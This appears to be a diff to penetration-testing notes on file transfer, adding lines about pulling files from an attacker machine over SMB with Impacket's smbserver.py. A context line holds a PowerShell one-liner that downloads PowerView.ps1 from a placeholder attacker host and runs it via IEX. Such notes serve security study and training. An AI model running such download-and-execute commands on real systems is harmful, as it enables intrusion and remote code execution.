@@ -107,4 +107,5 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX -UseBasicParsing
 ---
 
 ## SMB Downloads
-- SMB protocol that runs on port 445 
+- SMB can be used from the target to download files from the attacker machine
+- `smbserver.py` from Impacket can be used to create a smb server in the attacker machine 
